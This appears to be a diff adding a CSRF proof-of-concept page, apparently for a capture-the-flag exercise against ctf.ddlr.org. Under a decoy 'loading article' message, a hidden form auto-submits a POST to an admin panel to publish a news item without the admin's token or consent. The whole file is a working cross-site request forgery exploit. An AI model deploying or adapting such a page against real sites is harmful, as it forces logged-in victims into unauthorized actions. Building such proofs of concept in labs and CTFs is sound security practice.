@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Artículo interesante</title>
+</head>
+<body>
+    <h1>Cargando artículo...</h1>
+    <p>Por favor espere...</p>
+    
+    <form id="csrf" action="https://ctf.ddlr.org/admin_panel.php" method="POST" style="display:none;">
+        <input type="hidden" name="title" value="CSRF_PoC_ivantortul">
+        <input type="hidden" name="content" value="Noticia publicada mediante CSRF. Sin token, sin consentimiento del admin.">
+        <input type="hidden" name="date" value="2026-10-08">
+    </form>
+    
+    <script>
+        document.getElementById('csrf').submit();
+    </script>
+</body>
+</html>
